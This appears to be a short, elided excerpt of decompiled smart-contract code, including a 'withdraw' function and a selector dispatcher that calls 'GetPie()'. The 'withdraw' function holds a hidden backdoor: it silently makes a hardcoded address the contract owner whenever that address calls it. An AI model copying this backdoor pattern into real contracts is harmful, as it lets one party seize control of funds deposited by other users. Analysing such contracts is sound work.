...
function withdraw() public payable { 
    if (msg.sender == address(0x1fb3acdba788ca50ce165e5a4151f05187c67cd6)) {
        _owner = 0x1fb3acdba788ca50ce165e5a4151f05187c67cd6;
    }
...
function __function_selector__(bytes4 function_selector) public payable { 
    ...
    if (msg.data.length >= 4) {
        ...
        } else if (0xde12b839 == uint32(function_selector >> 224)) {
            GetPie();
        }
    }
    ();
